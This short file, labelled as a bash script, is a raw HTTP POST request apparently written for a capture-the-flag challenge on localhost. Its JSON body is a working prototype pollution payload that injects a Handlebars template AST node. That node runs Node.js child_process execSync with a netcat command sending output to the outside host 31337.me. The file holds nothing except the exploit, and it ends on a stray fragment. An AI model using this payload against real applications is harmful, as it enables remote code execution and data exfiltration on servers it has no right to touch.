#!/bin/bash
POST /api/submit HTTP/1.1
Host: localhost:1337
Content-Length: 405
Content-Type: application/json

{"artist.name":"Westaway",
  "__proto__.type": "Program",
    "__proto__.body": [{
        "type": "MustacheStatement",
        "path": 0,
        "params": [{
            "type": "NumberLiteral",
            "value": "process.mainModule.require('child_process').execSync(`nc 31337.me 4445 -e ls`)"
        }],
        "loc": {
            "start": 0,
            "end": 0
        }
    }]
}).text)